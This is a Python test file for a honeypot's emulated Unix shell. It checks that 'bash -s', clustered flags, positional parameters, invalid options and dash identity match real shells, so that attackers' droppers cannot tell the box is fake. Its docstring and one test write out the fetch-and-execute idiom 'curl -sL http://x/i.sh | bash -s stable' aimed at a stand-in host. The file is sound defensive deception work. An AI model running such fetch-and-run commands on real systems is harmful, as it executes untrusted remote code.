r"""bash -s: the flag that read as a filename.

Fiftieth coherence sweep. Found while writing up an SSH report: the
srb.sh actor's session showed `fi` and `done` as standalone commands, so
I checked whether multi-line scripts ran as a unit. They do -- that was
per-line nested-batch logging. But the probe I used to check it,
`bash -s`, did not:

    echo id | bash -s              bash: -s: No such file or directory   rc 127
    curl -sL URL | bash -s stable  bash: -s: No such file or directory   rc 127
    bash -lc id                    bash: -lc: No such file or directory  rc 127

Every flag that was not literally -c, -i or --version fell through to
"treat argv[0] as a script path", so an unsupported *option* was reported
as a missing *file*. That is the worst possible wrong answer here: rc 127
and "No such file or directory" is exactly what a real box says when the
download failed, so a dropper reads it as "my payload is not there" and
retries the fetch rather than concluding the shell is odd.
`curl ... | bash -s --` is one of the commonest installer shapes there
is, and `echo ... | bash` (no -s) already worked, so the box handled the
idiom and refused the spelling.

Four more came out of the same block:

  - Positional parameters were dropped. `bash script.sh alpha beta` gave
    $# = 0, so every script that takes an argument silently ran its
    no-argument path.
  - An invalid option gave rc 127 and "No such file or directory" where
    bash gives rc 2, "bash: -Z: invalid option" and a usage block, and
    dash gives "dash: 0: Illegal option -Z".
  - `cmd_dash = cmd_sh` was overwritten by `cmd_dash = cmd_bash` on the
    very next line, so `sh -c` correctly reported dash while `dash -c`
    announced bash 5.2.37 and $0 = bash.
  - Of the three ways into a subshell -- -c, script file, stdin -- only
    -c scrubbed BASH_VERSION under dash. `sh -c` said it was dash;
    `sh script.sh` and `... | sh` both said bash. One binary, three
    doors, two answers.

Reference measured on the dev host with real bash 5.2 and real dash:

    echo 'echo A=$1 n=$#' | bash -s alpha beta   A=alpha n=2
    bash -lc id                                  uid=0(root) ...
    bash -Z                                      -Z: invalid option  rc 2
    bash -c                                      -c: option requires an argument  rc 2
    bash /tmp/z.sh AA                            zero=/tmp/z.sh one=AA
    bash -c 'echo $0 $1' NAME ARG1               NAME ARG1
    dash -c 'echo bv=[$BASH_VERSION] zero=$0'    bv=[] zero=dash
    dash -Z                                      dash: 0: Illegal option -Z  rc 2

Run from `honeypot/`, or on the guest.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fakeshell as fs                                          # noqa: E402

PASS, FAIL = [], []


def run(script, user="root"):
    s = fs.Shell(fs.VFS(), user=user, peer="203.0.113.77")
    s.exec_mode = True
    out = s.run(script)
    err = "".join(s._err)
    s._err.clear()
    return (out + err), s.last_rc


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-46s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "want %r got %r" % (want, got))


def case(script, want, rc=0):
    out, got_rc = run(script)
    eq("out: %s" % script[:44], out.strip(), want)
    eq("rc:  %s" % script[:44], got_rc, rc)


ID = "uid=0(root) gid=0(root) groups=0(root)"


# -- -s reads stdin ------------------------------------------------------

def t_dash_s_reads_stdin():
    case("echo id | bash -s", ID)
    case("echo id | sh -s", ID)
    case("echo id | dash -s", ID)


def t_dash_s_is_not_a_filename():
    """The old answer was indistinguishable from a failed download.

    The curl form only gets the ENOENT check: the emulated fetch answers
    any URL with a synthetic ELF, so piping it into a shell gives 127 for
    the honest reason that the bytes are not a script.
    """
    for script in ("echo id | bash -s", "printf 'id\\n' | bash -s stable"):
        out, rc = run(script)
        check("no ENOENT: %s" % script[:30],
              "No such file or directory" not in out, out[:70])
        check("not rc 127: %s" % script[:30], rc != 127, "rc=%d" % rc)
    out, _rc = run("curl -sL http://x/i.sh | bash -s stable")
    check("curl-pipe: flag is not a filename",
          "-s: No such file or directory" not in out, out[:70])


def t_dash_s_takes_positional_args():
    case("echo 'echo A=$1 n=$#' | bash -s alpha beta", "A=alpha n=2")
    case("echo 'echo A=$1' | bash -s -- stable", "A=stable")


def t_bare_pipe_still_works():
    """This already worked; it is what made the -s failure invisible."""
    case("echo id | bash", ID)
    case("echo id | sh", ID)


# -- clustered short options ---------------------------------------------

def t_clustered_flags_with_c():
    case("bash -lc id", ID)
    case("bash -ic id", ID)
    case("sh -lc id", ID)


def t_plain_dash_c_still_works():
    case("bash -c id", ID)
    case("bash -c 'echo hi'", "hi")


def t_dash_dash_ends_options():
    case("echo 'echo ok' | bash -s --", "ok")


# -- positional parameters -----------------------------------------------

def t_script_file_gets_its_args():
    case("printf '%s\\n' 'echo one=$1 two=$2 n=$#' > /tmp/pp.sh; "
         "bash /tmp/pp.sh alpha beta", "one=alpha two=beta n=2")


def t_script_file_is_dollar_zero():
    case("printf '%s\\n' 'echo zero=$0' > /tmp/z.sh; bash /tmp/z.sh", "zero=/tmp/z.sh")


def t_dash_c_name_becomes_dollar_zero():
    """bash -c CMD NAME ARG: NAME is $0, not $1."""
    case("bash -c 'echo z=$0 o=$1' NAME ARG1", "z=NAME o=ARG1")


def t_dash_c_without_a_name():
    case("bash -c 'echo z=$0'", "z=bash")
    case("sh -c 'echo z=$0'", "z=sh")


# -- invalid options -----------------------------------------------------

def t_bash_invalid_option():
    out, rc = run("bash -Z")
    check("bash -Z says invalid option", "-Z: invalid option" in out, out[:60])
    check("bash -Z prints usage", "GNU long options:" in out, out[:60])
    check("bash -Z not ENOENT", "No such file" not in out, out[:60])
    eq("bash -Z rc", rc, 2)


def t_dash_invalid_option():
    """dash rejects differently, and says so differently."""
    out, rc = run("dash -Z")
    check("dash -Z illegal option", "dash: 0: Illegal option -Z" in out, out[:60])
    check("dash -Z has no usage block", "GNU long options:" not in out, out[:60])
    eq("dash -Z rc", rc, 2)
    out, rc = run("sh -Z")
    check("sh -Z illegal option", "sh: 0: Illegal option -Z" in out, out[:60])


def t_missing_option_argument():
    out, rc = run("bash -c")
    check("bash -c wants an argument",
          "-c: option requires an argument" in out, out[:60])
    check("no usage block for this one", "GNU long options:" not in out, out[:60])
    eq("bash -c rc", rc, 2)


def t_a_real_missing_script_still_says_enoent():
    """The ENOENT answer is right here and must survive."""
    out, rc = run("bash /nope.sh")
    check("missing script ENOENT",
          "bash: /nope.sh: No such file or directory" in out, out[:60])
    eq("missing script rc", rc, 127)


def t_valid_flags_are_not_rejected():
    for f in ("-e", "-x", "-u", "-r", "--norc", "--noprofile", "--posix", "-l"):
        out, rc = run("echo id | bash %s" % f)
        check("accepts %s" % f, "invalid option" not in out and rc != 2, out[:50])


# -- one binary, one answer ----------------------------------------------

def t_dash_is_not_bash():
    case("dash -c 'echo bv=[$BASH_VERSION] zero=$0'", "bv=[] zero=dash")
    case("sh -c 'echo bv=[$BASH_VERSION] zero=$0'", "bv=[] zero=sh")


def t_every_door_gives_the_same_answer():
    """-c, script file and stdin must agree about which shell this is."""
    body = "echo bv=[$BASH_VERSION]"
    a, _ = run("sh -c '%s'" % body)
    b, _ = run("printf '%%s\\n' '%s' > /tmp/bv.sh; sh /tmp/bv.sh" % body)
    c, _ = run("echo '%s' | sh" % body)
    eq("sh -c    is dash", a.strip(), "bv=[]")
    eq("sh file  is dash", b.strip(), "bv=[]")
    eq("sh stdin is dash", c.strip(), "bv=[]")
    check("all three doors agree", a.strip() == b.strip() == c.strip(),
          "%r %r %r" % (a.strip(), b.strip(), c.strip()))


def t_bash_still_says_bash():
    out, _ = run("bash -c 'echo bv=[$BASH_VERSION]'")
    check("bash keeps its version", out.strip().startswith("bv=[5."), out[:40])


def t_version_flag():
    out, rc = run("bash --version")
    check("bash --version", out.startswith("GNU bash, version 5.2.37"), out[:40])
    eq("bash --version rc", rc, 0)


def t_the_shell_name_survives_a_previous_sh():
    """One `sh` earlier in the session must not rename bash.

    cmd_sh restores _shell_name to its previous value -- None the first
    time -- and getattr's default only fires when the attribute is
    missing, so every later error said "None:". Every other case here
    builds a fresh Shell, which is exactly why only the live guest saw
    it. Reuse one shell on purpose.
    """
    s = fs.Shell(fs.VFS(), user="root", peer="203.0.113.77")
    s.exec_mode = True
    s.run("sh -c 'echo hi'")
    s.run("bash /nope.sh")
    err = "".join(s._err)
    check("bash keeps its name after sh",
          err.startswith("bash: /nope.sh:"), err[:60])
    check("no None in the error", "None" not in err, err[:60])
    s._err.clear()
    s.run("dash -c 'echo hi'")
    s.run("bash -Z")
    err = "".join(s._err)
    check("invalid option keeps its name after dash",
          err.startswith("bash: -Z:"), err[:60])


TESTS = [t_the_shell_name_survives_a_previous_sh, t_dash_s_reads_stdin, t_dash_s_is_not_a_filename,
         t_dash_s_takes_positional_args, t_bare_pipe_still_works,
         t_clustered_flags_with_c, t_plain_dash_c_still_works,
         t_dash_dash_ends_options, t_script_file_gets_its_args,
         t_script_file_is_dollar_zero, t_dash_c_name_becomes_dollar_zero,
         t_dash_c_without_a_name, t_bash_invalid_option,
         t_dash_invalid_option, t_missing_option_argument,
         t_a_real_missing_script_still_says_enoent,
         t_valid_flags_are_not_rejected, t_dash_is_not_bash,
         t_every_door_gives_the_same_answer, t_bash_still_says_bash,
         t_version_flag]


def main():
    for t in TESTS:
        try:
            t()
        except Exception as exc:                              # noqa: BLE001
            check(t.__name__, False, "crashed: %r" % (exc,))
    print("passed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:8]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
